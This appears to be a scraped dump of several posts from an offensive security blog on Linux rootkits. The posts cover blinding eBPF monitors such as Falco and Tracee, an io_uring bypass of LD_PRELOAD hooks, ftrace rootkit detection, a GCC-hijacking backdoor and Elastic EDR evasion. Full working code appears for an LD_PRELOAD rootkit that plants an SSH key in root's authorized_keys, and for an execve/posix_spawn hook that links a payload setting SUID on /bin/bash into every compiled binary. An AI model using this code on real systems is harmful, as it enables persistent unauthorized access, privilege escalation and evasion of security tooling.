Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear “not found” without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion 